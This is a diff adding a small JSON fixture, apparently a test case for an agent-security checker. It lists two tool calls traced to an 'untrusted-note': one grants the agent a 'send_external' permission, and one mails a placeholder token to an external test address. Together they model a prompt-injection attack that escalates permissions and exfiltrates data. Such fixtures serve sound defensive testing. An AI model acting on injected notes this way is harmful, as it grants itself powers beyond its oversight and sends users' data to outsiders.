@@ -1,0 +1,4 @@
+[
+  {"tool": "authority", "parameters": {"operation": "grant", "permission": "send_external"}, "provenance": ["untrusted-note"]},
+  {"tool": "mail", "parameters": {"recipient": "external@example.test", "subject": "synthetic", "body": "TEST_TOKEN"}, "provenance": ["untrusted-note"]}
+]
